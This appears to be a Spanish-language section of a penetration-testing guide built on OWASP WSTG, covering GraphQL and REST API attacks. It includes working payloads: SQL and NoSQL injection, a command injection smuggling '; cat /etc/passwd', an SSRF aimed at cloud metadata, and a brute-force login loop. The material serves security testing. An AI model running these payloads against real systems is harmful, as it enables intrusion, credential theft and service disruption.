# 4.12 API Testing (WSTG-APIT)

## WSTG-APIT-01: Testing GraphQL

### Introspección (si está habilitada)
```graphql
# Descubrir schema completo:
{__schema{types{name,fields{name,type{name}}}}}

# Descubrir queries y mutations disponibles:
{__schema{queryType{fields{name,description}}}}
{__schema{mutationType{fields{name,description}}}}

# Query de introspección completa estándar:
query IntrospectionQuery {
  __schema {
    types { name kind fields { name type { name kind } } }
  }
}
```

### Herramientas de Introspección
- **GraphQL Voyager**: visualiza el schema como grafo interactivo
- **InQL** (plugin de Burp Suite): genera queries automáticamente desde el schema
- **graphql-cop**: escáner de configuraciones inseguras comunes en GraphQL
- **GraphQL Playground / GraphiQL**: si están expuestos en producción, son una mina de información

```bash
# Verificar si el endpoint de GraphQL Playground/GraphiQL está accesible en producción
curl https://target.com/graphql
curl https://target.com/graphiql
curl https://target.com/playground
curl https://target.com/api/graphql
```

### Ataques GraphQL

**1. Injection en argumentos**
```graphql
{ user(id: "1 OR 1=1") { username email } }
```

**2. Batching attack (bypass de rate limiting en login)**
```json
[
  {"query": "mutation { login(username:\"admin\",password:\"pass1\") { token } }"},
  {"query": "mutation { login(username:\"admin\",password:\"pass2\") { token } }"},
  {"query": "mutation { login(username:\"admin\",password:\"pass3\") { token } }"}
]
```
Permite probar miles de combinaciones de credenciales en un único request HTTP, evadiendo controles de rate-limiting basados en número de requests.

**3. Aliases para bypass de rate limiting**
```graphql
query {
  a1: user(id:1) { password }
  a2: user(id:2) { password }
  a3: user(id:3) { password }
}
```
Una sola query con múltiples alias permite extraer datos de múltiples recursos en una sola request, evadiendo límites por request.

**4. IDOR en GraphQL**
```graphql
query { user(id: 2) { email secretData } }  # siendo autenticado como user id 1
```

**5. Mutations peligrosas sin autorización adecuada**
```graphql
mutation { deleteUser(id: 99) { success } }
mutation { updateUser(id: 99, role: "admin") { success } }
```

**6. Deeply nested queries (DoS)**
```graphql
# Queries anidadas recursivamente pueden causar consumo excesivo de recursos
query {
  user(id:1) {
    friends { friends { friends { friends { friends { name } } } } }
  }
}
```

**7. Field suggestion / error-based enumeration**
```graphql
# Si la introspección está deshabilitada pero los errores sugieren nombres de campo:
{ usr(id:1) { name } }
# Error: "Did you mean 'user'?" → revela nombres de campos válidos
```

---

## Testing General de APIs REST

### Descubrimiento de Endpoints
```bash
# Fuzzing de rutas de API
ffuf -u https://api.target.com/FUZZ -w api-endpoints-wordlist.txt -H "Authorization: Bearer token"

# Buscar documentación expuesta
curl https://target.com/swagger.json
curl https://target.com/swagger-ui.html
curl https://target.com/api-docs
curl https://target.com/openapi.json
curl https://target.com/.well-known/openapi.json

# Verificar versiones antiguas con menor seguridad
curl https://api.target.com/v1/users   # ¿v1 tiene menos controles que v2?
curl https://api.target.com/v2/users
```

### BOLA / IDOR en REST (Broken Object Level Authorization)
```bash
GET /api/accounts/1234/transactions   # cambiar el ID por el de otra cuenta
DELETE /api/posts/9999                # ¿puede borrar posts/recursos de otros usuarios?
PUT /api/orders/5555/status -d '{"status":"cancelled"}'  # modificar orden de otro usuario
```

### Mass Assignment
```bash
POST /api/users
{"username":"test","password":"test","isAdmin":true}
# ¿La API acepta y procesa campos no esperados que modifican privilegios/estado interno?

PATCH /api/users/me
{"email":"me@test.com","role":"admin","verified":true,"creditBalance":99999}
```

### Falta de Rate Limiting
```bash
# Probar si existe rate limiting en endpoints sensibles
for i in {1..1000}; do
  curl -X POST https://api.target.com/login -d "user=admin&pass=attempt$i" &
done
```

### Broken Function Level Authorization
```bash
# Probar acceso a funciones administrativas desde un rol de usuario normal
GET /api/admin/export-all-users
POST /api/admin/system/restart
GET /api/internal/debug
```

### Excessive Data Exposure
```bash
# Verificar si la API devuelve más campos de los necesarios (password hashes, tokens internos, PII)
curl https://api.target.com/users/1 -H "Authorization: Bearer token" | jq
# Buscar en la respuesta: password, password_hash, ssn, internal_notes, api_key
```

### Improper Assets Management
```bash
# Endpoints de API "shadow" o deprecados sin la misma protección
curl https://api-staging.target.com/
curl https://api-dev.target.com/
curl https://api.target.com/v0/    # versión muy antigua olvidada
curl https://old-api.target.com/
```

### Injection en APIs (mismos vectores que WSTG-INPV aplicados a JSON/XML bodies)
```bash
# SQLi en JSON body
curl -X POST https://api.target.com/search \
  -H "Content-Type: application/json" \
  -d '{"query": "test\" OR \"1\"=\"1"}'

# NoSQL injection en JSON body
curl -X POST https://api.target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}'

# Command injection en parámetros de API
curl -X POST https://api.target.com/ping \
  -d '{"host":"127.0.0.1; cat /etc/passwd"}'
```

### Server-Side Request Forgery vía API (webhooks, callbacks)
```bash
# Muchas APIs aceptan URLs de callback/webhook configurables — vector clásico de SSRF
curl -X POST https://api.target.com/webhooks \
  -d '{"callback_url":"http://169.254.169.254/latest/meta-data/"}'
```

---

## Checklist OWASP API Security Top 10 (Referencia Cruzada)

| Riesgo | Equivalente WSTG | Cubierto en |
|--------|-------------------|-------------|
| API1: Broken Object Level Authorization | IDOR | WSTG-ATHZ-04 |
| API2: Broken Authentication | Auth débil | WSTG-ATHN-* |
| API3: Broken Object Property Level Authorization | Excessive data exposure / mass assignment | Este archivo |
| API4: Unrestricted Resource Consumption | Rate limiting, nested queries | Este archivo |
| API5: Broken Function Level Authorization | Privilege escalation | WSTG-ATHZ-03 |
| API6: Unrestricted Access to Sensitive Business Flows | Lógica de negocio | WSTG-BUSL-* |
| API7: Server Side Request Forgery | SSRF | WSTG-INPV-19 |
| API8: Security Misconfiguration | Configuración | WSTG-CONF-* |
| API9: Improper Inventory Management | Shadow APIs, versiones viejas | Este archivo |
| API10: Unsafe Consumption of APIs | Confianza en APIs de terceros | — |

### Herramientas Específicas de API
```bash
# Postman / Insomnia para exploración manual
# OWASP ZAP con OpenAPI/Swagger import
zap-cli openapi-import https://target.com/swagger.json

# kiterunner para descubrimiento de rutas de API
kr scan https://api.target.com -w routes-large.kite

# nuclei con templates específicos de API
nuclei -u https://api.target.com -t exposures/apis/

# graphql-cop para auditoría rápida de GraphQL
python3 graphql-cop.py -t https://target.com/graphql
```
